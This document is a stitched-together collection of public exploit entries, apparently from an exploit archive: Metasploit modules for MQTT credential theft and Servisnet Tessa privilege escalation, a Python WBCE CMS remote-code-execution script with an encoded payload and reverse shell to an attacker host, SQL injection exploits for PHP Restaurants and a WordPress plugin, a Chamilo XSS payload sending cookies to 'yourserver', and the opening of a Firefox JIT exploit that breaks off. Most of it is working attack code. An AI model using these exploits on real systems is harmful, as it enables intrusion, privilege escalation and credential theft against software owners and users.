      #word = data.scan(/"#{string_to_split}"\] = "([\S\s]*?)"/)
      mqtt_host = data.scan(/host: '([\S\s]*?)'/)[0][0]
      rhost = mqtt_host.split('mqtts://').join('')
      print_status("MQTT Host: #{mqtt_host}") 
      mqtt_port = data.scan(/port: ([\S\s]*?),/)[0][0]
      print_status("MQTT Port: #{mqtt_port}")
      mqtt_end = data.scan(/endpoint: '([\S\s]*?)'/)[0][0]
      print_status("MQTT Endpoint: #{mqtt_end}")
      mqtt_cl = data.scan(/clientId: '([\S\s]*?)'/)[0][0]
      print_status("MQTT clientId: #{mqtt_cl}")
      mqtt_usr = data.scan(/username: '([\S\s]*?)'/)[1][0]
      print_status("MQTT username: #{mqtt_usr}")
      mqtt_pass = data.scan(/password: '([\S\s]*?)'/)[1][0]
      print_status("MQTT password: #{mqtt_pass}")

      print_status("##### Starting MQTT login sweep #####")

      # Removed brute force materials that can be included for the collection.
      cred_collection = Metasploit::Framework::CredentialCollection.new(
        password: mqtt_pass,
        username: mqtt_usr
      )
      # this definition already exists in "auxiliary/scanner/mqtt/connect". Moved into exploit.
      cred_collection = prepend_db_passwords(cred_collection)

      scanner = Metasploit::Framework::LoginScanner::MQTT.new(
        host: rhost,
        port: mqtt_port,
        read_timeout: datastore['READ_TIMEOUT'],
        client_id: client_id,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: datastore['ConnectTimeout'],
        max_send_size: datastore['TCP::max_send_size'],
        send_delay: datastore['TCP::send_delay'],
        framework: framework,
        framework_module: self,
        ssl: datastore['SSL'],
        ssl_version: datastore['SSLVersion'],
        ssl_verify_mode: datastore['SSLVerifyMode'],
        ssl_cipher: datastore['SSLCipher'],
        local_port: datastore['CPORT'],
        local_host: datastore['CHOST']
      )

      scanner.scan! do |result|
        credential_data = result.to_h
        credential_data.merge!(
          module_fullname: fullname,
          workspace_id: myworkspace_id
        )
        password = result.credential.private
        username = result.credential.public
        if result.success?
          credential_core = create_credential(credential_data)
          credential_data[:core] = credential_core
          create_credential_login(credential_data)
          print_good("MQTT Login Successful: #{username}/#{password}")
        else
          invalidate_login(credential_data)
          vprint_error("MQTT LOGIN FAILED: #{username}/#{password} (#{result.proof})")
        end
      end
     end
  end

  def auth_bypass
    res = send_request_cgi({
    # default.a.defaults.headers.post["Authorization"] check
      'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
      'method'  => 'GET'
    })     
    
    if res && res.code == 200 && res.body =~ /default.a.defaults.headers.post/
     token = split(res.body, 'Authorization')
     print_status("Authorization: #{token}") 
     return token
    else
     fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end
  end

  def check         
    if auth_bypass =~ /Basic/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end
 
  def run
    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end
    check_mqtt   
  end
end
  ##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Servisnet Tessa - Privilege Escalation (Metasploit)',
      'Description'    => %q(
        This module exploits privilege escalation in Servisnet Tessa, triggered by add new sysadmin user with any user authorization .
        An API request to "/data-service/users/[userid]" with any low-authority user returns other users' information in response.
                The encrypted password information is included here, but privilage escelation is possible with the active sessionid value.

                var token = Buffer.from(`${user.username}:${user.usersessionid}`, 'utf8').toString('base64');

                The logic required for the Authorization header is as above.
                Therefore, after accessing an authorized user ID value and active sessionId value,
                if the username and sessionId values are encoded with base64, a valid Token will be obtained and a new admin user can be added.       

      ),
      'References'     =>
        [
          [ 'CVE', 'CVE-2022-22832' ],
          [ 'URL', 'https://www.pentest.com.tr/exploits/Servisnet-Tessa-Privilege-Escalation.html' ],
          [ 'URL', 'http://www.servisnet.com.tr/en/page/products' ]
        ],
      'Author'         =>
        [
          'Özkan Mustafa AKKUŞ <AkkuS>' # Discovery & PoC & MSF Module @ehakkus
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Dec 22 2021",
      'DefaultOptions' =>
        {
          'RPORT' => 443,
          'SSL'   => true
        }
    ))

    register_options([
    OptString.new('USERNAME',  [true, 'Servisnet Username']),
        OptString.new('PASSWORD',  [true, 'Servisnet Password']),
        OptString.new('TARGETURI',  [true, 'Base path for application', '/'])
    ])
  end
  # split strings to salt
  def split(data, string_to_split) 
    word = data.scan(/"#{string_to_split}"\] = "([\S\s]*?)"/)
    string = word.split('"]').join('').split('["').join('')
    return string
  end 
  # split JSONs to salt
  def splitJSON(data, string_to_split) 
    word = data.scan(/"#{string_to_split}":"([\S\s]*?)"/)
    string = word.split('"]').join('').split('["').join('')
    return string
  end
  # split JSONs to salt none "
  def splitJSON2(data, string_to_split) 
    word = data.scan(/"#{string_to_split}":([\S\s]*?),/)[0]
    string = word.split('"]').join('').split('["').join('')
    return string
  end

  def app_path
    res = send_request_cgi({
    # default.a.get( check
      'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
      'method'  => 'GET'
    })     
    
    if res && res.code == 200 && res.body =~ /baseURL/
      data = res.body
      #word = data.scan(/"#{string_to_split}"\] = "([\S\s]*?)"/)
      base_url = data.scan(/baseURL: '\/([\S\s]*?)'/)[0] 
      return base_url
    else
      fail_with(Failure::NotVulnerable, 'baseURL not found!')
    end
  end

  def add_user(token, app_path)
     newuser = Rex::Text.rand_text_alpha_lower(8)   
     id = Rex::Text.rand_text_numeric(4)   
     # encrypted password hxZ8I33nmy9PZNhYhms/Dg== / 1111111111
     json_data = '{"alarm_request": 1, "city_id": null, "city_name": null, "decryptPassword": null, "email": "' + newuser + '@localhost.local", "id": ' + id + ', "invisible": 0, "isactive": 1, "isblocked": 0, "levelstatus": 1, "local_authorization": 1, "mail_request": 1, "name": "' + newuser + '", "password": "hxZ8I33nmy9PZNhYhms/Dg==", "phone": null, "position": null, "region_name": "test4", "regional_id": 0, "role_id": 1, "role_name": "Sistem Admin", "rolelevel": 3, "status": null, "surname": "' + newuser + '", "totalRecords": null, "try_pass_right": 0, "userip": null, "username": "' + newuser + '", "userType": "Lokal Kullanıcı"}'

     res = send_request_cgi(
       {
       'method' => 'POST',
       'ctype'  => 'application/json',
       'uri' => normalize_uri(target_uri.path, app_path, 'users'),
       'headers' =>
         {
           'Authorization' => token
         },
       'data' => json_data
      })

      if res && res.code == 200 && res.body =~ /localhost/
        print_good("The sysAdmin authorized user has been successfully added.")
        print_status("Username: #{newuser}")
        print_status("Password: 1111111111")
      else
        fail_with(Failure::NotVulnerable, 'An error occurred while adding the user. Try again.')
      end
  end

  def sessionid_check

    res = send_request_cgi({
    # user.usersessionid check
      'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
      'method'  => 'GET'
    })     
    
    if res && res.code == 200 && res.body =~ /user.usersessionid/
          return Exploit::CheckCode::Vulnerable
    else
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end

  end

  def find_admin(token, userid, app_path)   

    res = send_request_cgi({
    # token check
      'uri'     => normalize_uri(target_uri.path, app_path, 'users', userid),
      'headers' =>
         {
           'Authorization' => token
         },
      'method'  => 'GET'
    })     

    if not res && res.code == 200 && res.body =~ /usersessionid/
      fail_with(Failure::NotVulnerable, 'An error occurred while use Token. Try again.')
    end

    loopid = userid.to_i
    $i = 0
    # The admin userid must be less than the low-authority userid.
    while $i < loopid  do
      $i +=1
      res = send_request_cgi({
       # token check
         'uri'     => normalize_uri(target_uri.path, app_path, 'users', $i),
         'headers' =>
            {
              'Authorization' => token
            },
         'method'  => 'GET'
       }) 

       if res.code == 200 and res.body.include? '"Sistem Admin"'
         admin_uname = splitJSON(res.body, 'username')
         admin_sessid = splitJSON(res.body, 'usersessionid')
         admin_userid = splitJSON2(res.body, 'id')
         enc_token = Rex::Text.encode_base64('' + admin_uname + ':' + admin_sessid + '')
         token_admin = 'Basic ' + enc_token + ''
         print_good("Excellent! Admin user found.")
         print_good("Admin Username: #{admin_uname}")
         print_good("Admin SessionId: #{admin_sessid}")
         if session_check(token_admin, admin_userid, admin_uname) == "OK"
           break
         end
       end
     end
  end

  def session_check(token, userid, user)     
    
      res = send_request_cgi({
       # session check
         'uri'     => normalize_uri(target_uri.path, app_path, 'users', userid),
         'headers' =>
            {
              'Authorization' => token
            },
         'method'  => 'GET'
       }) 

       if res && res.code == 200 && res.body =~ /managers_codes/
         print_good("Admin session is active.")
         add_user(token, app_path)
         return "OK"
       else
         print_status("Admin user #{user} is not online. Try again later.")
         return "NOT"
       end   
  end

  def login_check(user, pass)

     json_data = '{"username": "' + user + '", "password": "' + pass + '"}'

     res = send_request_cgi(
       {
       'method' => 'POST',
       'ctype'  => 'application/json',
       'uri' => normalize_uri(target_uri.path, app_path, 'api', 'auth', 'signin'),
       'data' => json_data
      })   
    
      if res && res.code == 200 && res.body =~ /usersessionid/
    sessid = splitJSON(res.body, 'usersessionid')
    userid = splitJSON2(res.body, 'id')
    print_status("Sessionid: #{sessid}") 
    print_status("Userid: #{userid}")
        enc_token = Rex::Text.encode_base64('' + user + ':' + sessid + '')
        token = 'Basic ' + enc_token + ''
    print_status("Authorization: #{token}")
        find_admin(token, userid, app_path)
 

      else
        fail_with(Failure::NotVulnerable, 'An error occurred while login. Try again.')
      end
  end

  def check     
    
    if sessionid_check
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end
 
  def run
    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end
    login_check(datastore['USERNAME'], datastore['PASSWORD'])   
  end
end
  # Exploit Title: WBCE CMS 1.5.2 - Remote Code Execution (RCE) (Authenticated)
# Date: 02/01/2022
# Exploit Author: Antonio Cuomo (arkantolo)
# Vendor Homepage: https://wbce.org/
# Software Link: https://wbce.org/de/downloads/
# Version: 1.5.2
# Tested on: Linux - PHP Version: 8.0.14
# Github repo: https://github.com/WBCE/WBCE_CMS

# -*- coding: utf-8 -*-
#/usr/bin/env python

import requests
import string
import base64
import argparse
import time
import io
from bs4 import BeautifulSoup #pip install beautifulsoup4

PAYLOAD = 'UEsDBBQAAAAIAI1+n1Peb3ztBAMAAFUHAAAMAAAAdDE4YmtuZXYucGhwhVVtT9swEP6OxH8wUaQmUqAJ24epUSYh6CY0CbQC2weGIje5UKuJndkOhSH++85OQqqqtBIizr08eZ6783U8nujoy3zJ4enwAF8ODxToVLMK0pJVTHuhH7u/prOby+urxIlOQid2WZ246Wz68256c3vvSHhKWe08xG4tpN70GJvxZYuGL1PF/kESfQ7D2F1JpiGlCW/KMnZBSiHf39QCyjIZNZxWQI5pTFYxYXlMxnPGx2pBjtkodnMKleBJiCeYN494YIVXNDzTTPAUnpnSyhvVGddlWgi5HPn+q1uzPBlMnm9yrDE5jvzXWjKuUbMznc2uZxNyTvlIExPp+DE8oyfy47cuxX+1lrC11EKx51SBViz3/E04o66H62PWIXsxUfwGpQIypP4+m11dXn2fkG+UlZATLUgbyxScEHK7YIrg39+GaSCZqNBDKM8JF0icalqeOIifLXImPWeM56aiamm7qkS2TArzX9TAPWxrYFsYmG5wYR9Ky+BTaMt0ZBPWVHV+4rXxG4JAZZLVWkhVQ5ZQKemLFyZf24NTsxqcwJGOH0SbxhUaT7cYkXItRQZKJeaZWtbtrAQb3wtck6Za3kylEpRoZAZej+B/1GxV0xUnFnRdD+oEWpn+pvMSy8D4o9d+4z58CLBAOwKifQGnHwbYkhvnO9mbJjP8C7wnL8RUAHKC9wykgpa1mRBs5cS2EiWsFqwE1PBqbgeIosXcov/GZmeCc7BXiGiQFeNUQ44wcyS3jN86kEHah0BdobeiuPjIU9pORSdyKNZ7VbDhvKnSbEH5I+SpCQOtkvdClUjU67CCfqEE/S4JzC6xE8B4uv6lLsO3JWmXhz/U9/r8B5lNzy6Qrct43eikMPF97rDHEHp7+oS0iYhQWFJrk9J6cKDWaQ3Sd1O7vbi+u91GbkDYT9CCbKFo5O2kd7qfHg7ALnqnu+kNIHvpvRVZKVRnxiD7NpR50xJtWuxw2SVircNaiPsfENJTcpXG06OVfNTt6W7mnc73hztI6fBAgm4kJ2H8H1BLAQI/ABQAAAAIAI1+n1Peb3ztBAMAAFUHAAAMACQAAAAAAAAAIAAAAAAAAAB0MThia25ldi5waHAKACAAAAAAAAEAGACAuZAFVv7XAYC5kAVW/tcB6Bk8KTf+1wFQSwUGAAAAAAEAAQBeAAAALgMAAAAA'

def main():
    parser = argparse.ArgumentParser(description='WBCE <= 1.5.2 - Remote Code Execution (Authenticated)')
    parser.add_argument('-x', '--url', type=str, required=True)
    parser.add_argument('-u', '--user', type=str, required=False)
    parser.add_argument('-p', '--password', type=str, required=False)
    parser.add_argument('-ah', '--attacker_host', type=str, required=False)
    parser.add_argument('-ap', '--attacker_port', type=str, required=False)
    args = parser.parse_args()
    print("\nWBCE 1.5.2 - Remote Code Execution (Authenticated)","\nExploit Author: Antonio Cuomo (Arkantolo)\n")
    exploit(args, PAYLOAD)

def exploit(args, payload):
    s2 = requests.Session()

    #login
    body= {'url':'','username_fieldname':'username_t18bknev','password_fieldname':'password_t18bknev','username_t18bknev':args.user,'password_t18bknev':args.password}
    r = s2.post(args.url+'/admin/login/index.php', data=body, allow_redirects=False)
    if(r.status_code==302 and r.headers['location'].find('/start/') != -1):
        print("[*] Login OK")
    else:
        print("[*] Login Failed")
        exit(1)

    time.sleep(1)
    
    #create droplet
    up = {'userfile':('t18bknev.zip', io.BytesIO(base64.b64decode(PAYLOAD)), "multipart/form-data")}
    r = s2.post(args.url+'/admin/admintools/tool.php?tool=droplets&upload=1', files=up)
    if(r.status_code==200 and r.text.find('1 Droplet(s) imported') != -1):
        print("[*] Droplet OK")
    else:
        print("[*] Exploit Failed")
        exit(1)

    time.sleep(1)
    
    #get csrf token
    r = s2.get(args.url+'/admin/pages/index.php')
    soup = BeautifulSoup(r.text, 'html.parser')
    formtoken = soup.find('input', {'name':'formtoken'})['value']
    
    #create page
    body= {'formtoken':formtoken,'title':'t18bknev','type':'wysiwyg','parent':'0','visibility':'public','save':''}
    r = s2.post(args.url+'/admin/pages/add.php', data=body, allow_redirects=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    try:
        page_id = soup.findAll("script")[9].string.split("location.href='")[-1].split("\");")[0].split("'")[0].split("=")[1]
        print("[*] Page OK ["+page_id+"]")
    except:
        print("[*] Exploit Failed")
        exit(1)
    
    time.sleep(1)
    
    #get csrf token
    print("[*] Getting token")
    r = s2.get(args.url+'/admin/pages/modify.php?page_id='+page_id)
    soup = BeautifulSoup(r.text, 'html.parser')
    formtoken = soup.find('input', {'name':'formtoken'})['value']
    section_id = soup.find('input', {'name':'section_id'})['value']
        
    time.sleep(1)
    
    #add droplet to page
    body= {'page_id':page_id,'formtoken':formtoken,'section_id':section_id,'content'+section_id:'[[t18bknev]]','modify':'save'}
    r = s2.post(args.url+'/modules/wysiwyg/save.php', data=body, allow_redirects=False)
    if(r.status_code==200 and r.text.find('Page saved') != -1):
        print("[*] Adding droplet OK")
    else:
        print("[*] Exploit Failed")
        exit(1)   
    
    time.sleep(1)
    
    input("Please make sure that your nc listner is ready...\n\nPRESS ENTER WHEN READY")
    body= {'rev_ip':args.attacker_host,'rev_port':args.attacker_port}
    r = s2.post(args.url+'/pages/t18bknev.php', data=body, allow_redirects=False)
    if(r.status_code==200):
        print("[*] Exploit OK - check your listner")
        exit(0)
    else:
        print("[*] Exploit Failed")
        exit(1)

if __name__ == '__main__':
    main()
  # Exploit Title: PHP Restaurants 1.0 - SQLi (Unauthenticated)
# Google Dork: None
# Date: 01/29/2022
# Exploit Author: Nefrit ID
# Vendor Homepage: https://github.com/jcwebhole
# Software Link: https://github.com/jcwebhole/php_restaurants
# Version: 1.0
# Tested on: Kali Linux & Windows 10

*SQL injection is a code injection technique used to attack
data-driven applications, in which malicious SQL statements are
inserted into an entry field for execution (e.g. to dump the database
contents to the attacker). wikipedia*


===Start===
Exploit Url = http://localhost/php_restaurants-master/admin/functions.php?f=deleteRestaurant&id=1337
AND (SELECT 3952 FROM (SELECT(SLEEP(5)))XMSid)

Burpsuite Proxy Intercept
GET /php_restaurants-master/admin/functions.php?f=deleteRestaurant&id=1337
HTTP/1.1
Host: web_server_ip
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69
Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://web_server_ip/php_restaurants-master/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: uid=1
Connection: close
       # Exploit Title: Wordpress Plugin Download Monitor WordPress V 4.4.4 - SQL Injection (Authenticated)
# Date 28.01.2022
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.download-monitor.com/
# Software Link: https://downloads.wordpress.org/plugin/download-monitor.4.4.4.zip
# Version: < 4.4.5
# Tested on: Ubuntu 20.04
# CVE: CVE-2021-24786
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24786/README.md

'''
Description:
The Download Monitor WordPress plugin before 4.4.5 does not properly validate and escape the "orderby" GET parameter
before using it in a SQL statement when viewing the logs, leading to an SQL Injection issue
'''

# Banner:
banner = '''

   ___         __    ____   ___ ____  _      ____  _  _ _____ ___   __   
  / __\/\   /\/__\  |___ \ / _ \___ \/ |    |___ \| || |___  ( _ ) / /_ 
 / /   \ \ / /_\_____ __) | | | |__) | |_____ __) | || |_ / // _ \| '_ \
/ /___  \ V //_|_____/ __/| |_| / __/| |_____/ __/|__   _/ /| (_) | (_) |
\____/   \_/\__/    |_____|\___/_____|_|    |_____|  |_|/_/  \___/ \___/
                                                                        
                                  [+] Download Monitor - SQL-Injection
                                  [@] Developed by Ron Jost (Hacker5preme)
'''
print(banner)

import argparse
import requests
from datetime import datetime

# User-Input:
my_parser = argparse.ArgumentParser(description='Wordpress Plugin RegistrationMagic - SQL Injection')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD

print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))

# Authentication:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'
check = session.get(auth_url)
# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}
auth = session.post(auth_url, headers=header, data=body)

# Exploit (WORKS ONLY IF ONE LOG EXISTS)
print('')
print ('[i] If the exploit does not work, log into wp-admin and add a file and download it to create a log')
print('')
# Generate payload for SQL-Injection
sql_injection_code = input('[+] SQL-INJECTION COMMAND: ')
sql_injection_code = sql_injection_code.replace(' ', '+')
exploitcode_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/edit.php?post_type=dlm_download&page=download-monitor-logs&orderby=download_date`' + sql_injection_code + '`user_id'
exploit = session.get(exploitcode_url)
print(exploit)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
  # Exploit Title: Chamilo LMS 1.11.14 - Account Takeover
# Date: July 21 2021
# Exploit Author: sirpedrotavares
# Vendor Homepage: https://chamilo.org
# Software Link: https://chamilo.org
# Version:  Chamilo-lms-1.11.x
# Tested on:  Chamilo-lms-1.11.x
# CVE: CVE-2021-37391
#Publication:
https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chamilo-lms-1.11.14-xss-vulnerabilities


Description:  A user without privileges in Chamilo LMS 1.11.x can send an
invitation message to another user, e.g., the administrator, through
main/social/search.php,
main/inc/lib/social.lib.php and steal cookies or execute arbitrary code on
the administration side via a stored XSS vulnerability via social network
the send invitation feature.  .
CVE ID: CVE-2021-37391
CVSS:  Medium - CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N
URL:
https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chamilo-lms-1.11.14-xss-vulnerabilities

Affected parameter: send private message - text field
Payload:  <img src=x onerror=this.src='
http://yourserver/?c='+document.cookie>


Steps to reproduce:
  1. Navigate to the social network menu
  2. Select the victim profile
  3. Add the payload on the text field
  4. Submit the request and wait for the payload execution

*Impact:* By using this vulnerability, an unprivileged user can steal
cookies from an admin account or force the administrator to create an
account with admin privileges with an HTTP 302 redirect.
*Mitigation*: Update the Chamilo to the latest version.
*Fix*:
https://github.com/chamilo/chamilo-lms/commit/de43a77049771cce08ea7234c5c1510b5af65bc8




Com os meus melhores cumprimentos,
--
*Pedro Tavares*
Founder and Editor-in-Chief at seguranca-informatica.pt
Co-founder of CSIRT.UBI
Creator of 0xSI_f33d <https://feed.seguranca-informatica.pt/>



seguranca-informatica.pt | @sirpedrotavares
<https://twitter.com/sirpedrotavares> | 0xSI_f33d
<https://feed.seguranca-informatica.pt/>
  # Exploit Title: Mozilla Firefox 67 - Array.pop JIT Type Confusion
# Date: 2021-12-07
# Type: RCE
# Platform: Windows
# Exploit Author: deadlock (Forrest Orr)
# Author Homepage: https://forrest-orr.net
# Vendor Homepage: https://www.mozilla.org/en-US/
# Software Link: https://ftp.mozilla.org/pub/firefox/releases/65.0.1/win64/en-US/
# Version: Firefox 67.0.2 64-bit and earlier
# Tested on: Windows 10 x64
# CVE: CVE-2019-11707
# Bypasses: DEP, High Entropy ASLR, CFG
# Full Hydseven exploit chain with sandbox escape (CVE-2019-11708): https://github.com/forrest-orr/Exploits/tree/main/Chains/Hydseven

<html>
<head>
</head>
<body>
<script>
/*
  _______ ___ ___ _______        _______ _______ _____ _______        _____ _____ _______ _______ _______
 |   _   |   Y   |   _   |______|       |   _   | _   |   _   |______| _   | _   |   _   |   _   |   _   |
 |.  1___|.  |   |.  1___|______|___|   |.  |   |.|   |   |   |______|.|   |.|   |___|   |.  |   |___|   |
 |.  |___|.  |   |.  __)_        /  ___/|.  |   `-|.  |\___   |      `-|.  `-|.  |  /   /|.  |   |  /   /
 |:  1   |:  1   |:  1   |      |:  1  \|:  1   | |:  |:  1   |        |:  | |:  | |   | |:  1   | |   | 
 |::.. . |\:.. ./|::.. . |      |::.. . |::.. . | |::.|::.. . |        |::.| |::.| |   | |::.. . | |   | 
 `-------' `---' `-------'      `-------`-------' `---`-------'        `---' `---' `---' `-------' `---' 

Overview
                                
This is a Windows variation of CVE-2019-11707, an exploit targetting a type
confusion bug in the Array.pop method during inlining/IonMonkey JIT compilation
of affected code in versions of Firefox up to 67.0.2.

Fundamentally this bug allows an attacker to trick IonMonkey into JIT'ing a
function popping and accessing an element of a specially crafted malicious
array without generating any speculative guards on the element type. In other
words, we can reliably produce an ASM routine for a JS function which is only
designed to handle array element access for a specific object type, while
allowing us to effectively modify the type of the element being accessed. Thus
a class object may be accessed as a float, a float as an integer, and so on.
The end result is a classic type confusion on the ASM layer which is leveraged
into an OOB array access, providing the basis for construction of R/W/AddressOf
primitives.

More specifically this bug allows for the creation of specially crafted malicious
arrays with a specific element type set. By creating a function which loops
through this malicious array and calls Array.pop on its elements, IonMonkey
can be made to JIT an ASM routine specifically optimized to only handle this
one specific type of array element. The bug comes into affect in the unique
edge case of an object prototype: when Array.pop attempts to access an element
at an index which does not exist (such as in a sparse array) it will then make
a secondary, fall-back attempt to access this element index on the prototype
of its associated array. This would not be an issue if IonMonkey tracked
modifications to the type sets of prototype elements but it does not.

...

bool hasIndexedProperty;
MOZ_TRY_VAR(hasIndexedProperty, ArrayPrototypeHasIndexedProperty(this, script()));
if (hasIndexedProperty) {
    trackOptimizationOutcome(TrackedOutcome::ProtoIndexedProps);
    return InliningStatus_NotInlined;
    }

...

This was the vulnerable piece of code in IonMonkey which enabled the bug. It
can be plainly seen that they did attempt to check types of indexed elements
on array prototypes but did so incorrectly: every array will by default have a
special ArrayPrototype object associated with it. However, we do not need to
leave this default layout intact. We can set a custom prototype on our
malicious array (this custom prototype itself being an array) and trick the
engine into checking the ArrayPrototype of our custom prototype for indexed
elements instead of the custom prototype which contains the malicious untracked
elements. Practically speaking:

var SparseTrapdoorArray = [BugArrayUint32, BugArrayUint32];

This will produce:

SparseTrapdoorArray -> ArrayPrototype

Now if a new array is created and set as the custom prototype of
SparseTrapdoorArray:

var CustomPrototype = [new Uint8Array(BugArrayBuf)];
SparseTrapdoorArray.__proto__ = CustomPrototype;

This will produce:

SparseTrapdoorArray -> CustomPrototype -> ArrayPrototype

Thus an element access on a non-existent element of SparseTrapdoorArray will
access this same index on CustomPrototype instead, and it will be the
ArrayPrototype of CustomPrototype which is checked by IonMonkey during
inlining, not the actual prototype of the SparseTrapdoorArray array ie. the
CustomPrototype. If SparseTrapdoorArray[0] were to not exist and be accessed,
it would result in an access to the Uint8Array element at CustomPrototype[0]
despite the JIT'd function being optimized for access to Uint32Array at
SparseTrapdoorArray[0].

~

Design

I created the exploit primitives for CVE-2019-11707 in much the same way as I
did CVE-2019-17026: the heap is groomed so that 3 objects are lined up
in memory. In this case they are ArrayBuffers.

[ArrayBuffer 1][ArrayBuffer 2][ArrayBuffer 3]

We use the bug to overflow array 1 and corrupt the ArrayBuffer of array 2,
artificially augmenting its length to encompass the NativeObject of array 3.
From this point onward, array 2 is used to corrupt the slots pointer within the
NativeObject of array 3 to do arbitrary reads, writes and addrof.

Once these primitives are obtained, a JIT spray is used to plant an egg hunter
shellcode in +RX memory within the firefox.exe content process being hijacked.
The ASM source for my egg hunter can be found here:
https://github.com/forrest-orr/Exploits/blob/main/Payloads/Source/DoubleStar/Stage1_EggHunter/Egghunter64.asm

The role of this egg hunter is to search out a magic QWORD in memory prefixing
an arbitrary shellcode (in this case a WinExec shellcode) stored as a
Uint8Array somewhere in this content process, disable DEP on it, and execute
it via a branch instruction.

The JIT code pointer of the JIT sprayed function is identified by using the
arbitrary read/addrof primitives to walk its JitInfo struct, and then a
secondary egg hunter within the JS itself is used to scan this JIT'd region for
the JIT sprayed egg hunter shellcode itself, stored as a double float array and
implanted at the end of the JIT'd ASM. Once this array is found, the JIT code
pointer is modified to point to it, and the JIT sprayed function is run one
last time, resulting in the WinExec shellcode being found in memory, set to
executable and executed.

~

Sandboxing

The lineage of the Firefox application involves a Medium Integrity AppContainer
firefox.exe "parent" process which is responsible for making network
connections and handling the UI, with a set of Low Integrity child/content
firefox.exe processes beneath it, each locked to a specific domain (in the past
it was one process per tab, now its one process per site) and responsible for
parsing and potentially compiling/executing Javascript.

The exploit in this source file is only able to compromise the child/content
process. These processes are heavily sandboxed, and are not able to make network
connections, perform (almost) any file I/O, launch processes, or affect the UI.
This means that by default, neither WinExec or MessageBox shellcodes will work
in this exploit.

For an example of how the child/content process sandbox may be escaped via a
secondary exploit, see either my Hydseven or Double Star exploit chains:
https://github.com/forrest-orr/Exploits/tree/main/Chains/Hydseven
https://github.com/forrest-orr/DoubleStar

In the case of this standalone exploit, in order to be able to see the affect
of a successful payload execution post-exploitation, you must adjust the
security.sandbox.content.level in the "about:config" down from 5 to atleast 2.

~

Credits

0vercl0k  - for the original research/analysis of CVE-2019-11708 and reverse
            engineering of xul.dll for "god mode" patching.
            
sherl0ck  - for his writeup on CVE-2019-11707.

*/

////////
////////
// Global helpers/settings
////////

